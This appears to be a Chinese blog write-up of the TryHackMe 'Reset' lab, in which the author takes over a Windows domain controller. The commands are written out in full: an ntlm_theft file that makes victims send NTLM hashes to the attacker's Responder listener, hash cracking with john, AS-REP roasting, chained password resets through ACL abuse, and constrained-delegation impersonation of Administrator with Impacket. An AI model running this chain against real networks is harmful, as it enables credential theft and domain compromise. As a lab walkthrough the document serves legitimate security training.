---
title: "THM Reset"
description: "TryHackMe篇之Reset"

date: 2024-10-25T13:45:52+08:00
lastmod: 2025-11-10T17:09:19+08:00

math: true
mermaid: true

categories:
  - TryHackMe
tags:
  - Windows
---
<!--more-->

> 靶机ip：10.10.219.65

# 信息收集

## nmap扫描

```bash
nmap --min-rate 10000 -A -sV -sC -p- 10.10.219.65
```

```nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-25 13:49 CST
Nmap scan report for 10.10.219.65
Host is up (0.63s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-25 05:50:16Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=HayStack.thm.corp
| Not valid before: 2024-10-24T05:48:35
|_Not valid after:  2025-04-25T05:48:35
| rdp-ntlm-info:
|   Target_Name: THM
|   NetBIOS_Domain_Name: THM
|   NetBIOS_Computer_Name: HAYSTACK
|   DNS_Domain_Name: thm.corp
|   DNS_Computer_Name: HayStack.thm.corp
|   DNS_Tree_Name: thm.corp
|   Product_Version: 10.0.17763
|_  System_Time: 2024-10-25T05:51:48+00:00
|_ssl-date: 2024-10-25T05:53:13+00:00; +22s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49673/tcp open  unknown
49675/tcp open  unknown
49703/tcp open  unknown
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: Host: HAYSTACK; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 21s, deviation: 0s, median: 21s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2024-10-25T05:51:48
|_  start_date: N/A

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
1   662.94 ms 10.14.0.1
2   663.13 ms 10.10.219.65

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 249.78 seconds
```

可以看出这是一台域控，并且域名是`HayStack.thm.corp`，将这个和` thm.corp`添加到`/etc/hosts`

## SMB

```bash
smbclient -L //10.10.219.65
```

![image-20241025135138717](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241025135202309-1900674591.png)

尝试连接`Data`目录

```bash
smbclient //10.10.219.65/Data
```

![image-20241025135442301](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241025135505429-2020002712.png)

发现每次操作文件名都会变化，先将文件下载到本地查看

![image-20241025135623489](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241025135646463-1583002200.png)

找到初始密码`ResetMe123!`

![image-20241025135706715](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241025135729828-1298084476.png)

在另一个pdf文件中发现一组用户名密码`LILY ONEILL:ResetMe123!`

## rpc

`rpcclient -U "" 10.10.219.65`

![image-20241025140217254](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241025140240543-805157185.png)

并没有什么信息

# 获取user.txt

在之前进行smb探测的时候发现目录会随着每次访问，在一定时间后就会改变文件名，说明不止我们一个人在访问这个目录，所以我们可以使用工具尝试在smb中捕获另一个人的hash

使用[ntlm_theft](https://github.com/Greenwolf/ntlm_theft)工具创建恶意文件

```bash
python3 ntlm_theft.py -g url -s 10.14.90.122 -f aaa
```

![image-20241025142146578](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241025142209751-1923196893.png)

在攻击机上监听

```bash
sudo responder -I tun0
```

将生成的文件传到靶机上

![image-20241025142631944](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241025142655232-1422163173.png)

在监听处我们就捕获到了一组hash

![image-20241025142732867](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241025142755759-907774947.png)

将其保存到`hash`文件，用于破解

使用`john`工具破解

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt 
```

![image-20241025143439961](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241025143503161-1529556282.png)

成功获取`AUTOMATE`的密码`Passw0rd1`

尝试登录

`evil-winrm -i 10.10.219.65 -u AUTOMATE -p Passw0rd1`

![image-20241025143753555](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241025143817037-942278707.png)

在`Desktop`找到`user.txt`

# 横向移动

## AS-REP Roasting

使用`bloodhound-pytohn`信息收集

```bash
bloodhound-python -ns 10.10.219.65 --dns-tcp -d THM.CORP -u automate -p Passw0rd1 -c All --zip
```

![image-20241025144624398](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241025144647833-553174619.png)

将收集的信息使用`Bloodhound`分析

![image-20241025150408916](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241025150432464-189680214.png)

发现有三个能够`AS-REP`攻击的用户

- `ERNESTO_SILVA@THM.CORP`
- `TABATHA_BRITT@THM.CORP`
- `LEANN_LONG@THM.CORP`

将用户名保存到`users`文件

使用`GetNPUsers.py`请求用户的`TGT`

```bash
GetNPUsers.py thm.corp/ -usersfile users -dc-ip 10.10.219.65
```

![image-20241025151428929](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241025151452294-1718262734.png)

分别使用`john`爆破

![image-20241025152652439](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241025152715817-367967576.png)

最终发现只有`TABATHA_BRITT`用户成功爆破，密码是`marlboro(1985)`

再对该用户进行信息搜集

```bash
bloodhound-python -ns 10.10.219.65 --dns-tcp -d THM.CORP -u TABATHA_BRITT -p 'marlboro(1985)' -c All --zip
```

![image-20241025161304577](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241025161327821-1280956437.png)将收集的信息使用`Bloodhound`分析

![image-20241025162837120](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241025162900833-2005768447.png)

找到利用链，我们想要到达`DARLA_WINTERS`，就是从`TABATHA_BRITT`到`SHAWMA_BRAY`的`GenericAll`，利用`ForceChangePassword`从`SHAWMA_BRAY`到`CRUZZ_HALL`，最后利用`GenericWrite`从`CRUZ_HALL`到`DARLA_WINTERS`

![image-20241025162252026](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241025162314922-442943433.png)

![image-20241025162152712](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241025162215576-292168178.png)

我们发现可以通过`RPC`利用`GenericAll`更改用户的密码，对于`ForceChangePassword`和`GenericWrite`同样可以适用

我们使用`TABATHA_BRITT`用户来操作

```bash
net rpc password "SHAWNA_BRAY" "Aa123456!" -U "thm.corp"/"TABATHA_BRITT"%"marlboro(1985)" -S "10.10.219.65"

net rpc password "CRUZ_HALL" "Aa123456!" -U "THM.CORP"/"SHAWNA_BRAY"%"Aa123456!" -S "10.10.219.65"

net rpc password "DARLA_WINTERS" "Aa123456!" -U "THM.CORP"/"CRUZ_HALL"%"Aa123456!" -S "10.10.219.65"
```

![image-20241025164828710](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241025164851767-362787753.png)

使用`crackmapexec`验证一下

```bash
crackmapexec smb 10.10.219.65 -u DARLA_WINTERS -p 'Aa123456!'
```

![image-20241025165434092](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241025165457028-896741427.png)

修改成功！再对`DARLA_WINTERS`信息收集

```bash
bloodhound-python -ns 10.10.219.65 --dns-tcp -d THM.CORP -u 'DARLA_WINTERS' -p 'Aa123456!' -c All --zip
```

![image-20241025172834592](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241025172857716-1006065661.png)

发现`DARLA_WINTERS`用户可以通过`CIFS`服务进行委派攻击，我们就可以模拟域控上`CIFS`服务的管理员

## 委派攻击

`Impacket` 的`getST`脚本将请求服务的`Ticket` 并将其保存为 `ccache`。如果帐户具有受限的委派权限，可以使用 `-impersonate` 标志代表其他用户请求票证。

使用 `impacket` 的`getST.py`获取票据

在请求票据之前，我们先输入下面这个命令。这个命令可以从指定的 NTP 服务器上获取准确的时间，并将系统时间调整到与之同步。

```bash
ntpdate -s haystack.thm.corp
```

然后再开始获取票据

```bash
getST.py -spn "cifs/haystack.thm.corp" -dc-ip 10.10.219.65 -impersonate "Administrator" "thm.corp/DARLA_WINTERS:Aa123456!"
```

![image-20241025175722380](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241025175746257-1822396632.png)

使用`KRB5CCNAME`环境变量设置 `ccache`

```bash
export KRB5CCNAME=Administrator@cifs_haystack.thm.corp@THM.CORP.ccache
```

再使用`wmiexec.py`登录`Administrator`

```bash
wmiexec.py -k -no-pass Administrator@haystack.thm.corp
```

![image-20241025181646460](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241025181710304-1116480087.png)

成功获得`Administrator`的权限

![image-20241025181845059](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241025181908376-2067529138.png)

在`Desktop`找到`root.txt`